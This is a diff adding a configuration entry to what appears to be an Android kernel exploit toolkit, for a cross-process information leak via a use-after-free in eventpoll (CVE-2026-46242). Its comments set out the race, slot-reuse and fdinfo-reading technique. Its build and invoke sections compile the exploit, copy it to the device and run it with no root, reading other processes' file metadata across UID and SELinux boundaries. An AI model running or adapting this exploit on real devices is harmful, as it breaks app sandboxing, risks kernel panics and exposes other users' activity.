@@ -1,0 +1,93 @@
+# entry.badepoll-leak@6.1 — CVE-2026-46242, the cross-process information leak.
+#
+# The one capability this CVE delivers today without any of the blocked
+# machinery. Same binary as the other badepoll entries, run with --leak:
+#
+#   race the close-vs-close UAF to a win, orphan the epitem, then leave the freed
+#   filp slot for the rest of the system to reuse and read whatever struct file
+#   lands there through /proc/self/fdinfo. ep_show_fdinfo() walks the orphan and
+#   prints the file's f_pos, inode number and filesystem s_dev -- so an app with
+#   no permissions reads the metadata of files OTHER processes (including
+#   privileged ones) are opening, across the UID and SELinux boundary. On
+#   hardware this observed /proc plus the com.android.runtime and com.android.virt
+#   APEX images within 120s.
+#
+# It also flags filesystems in active use that our own mount namespace does not
+# show us (HIDDEN_FS), because i_sb->s_dev is a global-superblock property that
+# namespace hiding cannot filter.
+#
+# Needs NO root, NO offsets (reads no kernel addresses), NO target header, and
+# NO reboot. It is offset-free, so unlike badepoll-esc it builds for any
+# android14-6.1 target. The residual panic risk is the same as any escalate: a
+# foreign eventpoll grabbing the orphan's freed kmalloc-256 slot -- rare, and the
+# leak is read long before teardown.
+
+schema = 1
+kind   = "entry"
+id     = "entry.badepoll-leak@6.1"
+cve    = "CVE-2026-46242"
+kmi    = ["android14-6.1"]
+
+composed = false
+status   = "cross-process info-leak PoC, hardware-verified (reproduce: ./pixel-ksu-root --recipe badepoll-leak). From uid 2000, reads f_pos/ino/sdev of files opened by other processes (/proc, com.android.runtime, com.android.virt APEX images) across the UID/SELinux boundary. Demonstrated capability, not root. Also flags namespace-hidden filesystems (HIDDEN_FS)."
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = ["cves/cve-2026-46242-badepoll/oracle46242.c"]
+includes = []
+depends  = []
+defines  = []
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-pthread", "-Werror"]
+opt      = ["-O2", "-g0"]
+ldflags  = []
+output   = "cve-2026-46242-oracle"
+uses_target_header = false
+
+[properties]
+retry_safe  = false
+# Residual only: the orphan's freed eventpoll slot can be grabbed by a foreign
+# eventpoll and walked. Rare, and the leak is observed well before any teardown.
+panic_risk  = { pre_slide = "low", post_slide = "low" }
+destructive = ["an orphaned epitem held live in the shot process (released by reboot)"]
+restores    = []
+provides      = []
+requires_caps = []
+retains       = []
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/badepoll-entry"
+mode = "755"
+# 120s watch of the reused slot after the first win. No root, no base replay.
+command = "cd @DEV_TMP@; @DEV_ENTRY@ --hunt 40000000 --max-seconds 300 --leak > @DEV_LOG@ 2>&1"
+accepts_base = false
+needs_root = false
+
+[markers]
+# The capability: a struct file we do not own, read through the orphan.
+pass = 'LEAK_OBSERVED \[[0-9]+\]'
+gate_fail = 'BADEPOLL_ORACLE_GATE_FAIL'
+restore_pass = 'BADEPOLL_NO_SUCH_RESTORE_PASS'
+restore_bad  = 'BADEPOLL_NO_SUCH_RESTORE_BAD'
+heartbeat = 'BADEPOLL_HEARTBEAT seq=[0-9]+'
+diag       = '(LEAK_DONE distinct_files_observed=[0-9]+|HIDDEN_FS .*|LEAK_OBSERVED .*).*'
+diag_count = 'distinct_files_observed=[0-9]+'
+
+[exit_map]
+"1" = "MISS"
+"2" = "REFUSED"
+"3" = "REFUSED"
+"4" = "PRECONDITION_FAIL"
+
+[provides]
+caps  = []
+field = ''
+label = ""
+
+[[setup]]
+command = "echo badepoll-leak cpus=$(grep -c ^processor /proc/cpuinfo) kernel=$(uname -r)"
+once_per_boot = true
+needs_root = false
+description = "record the run conditions in the shot log"
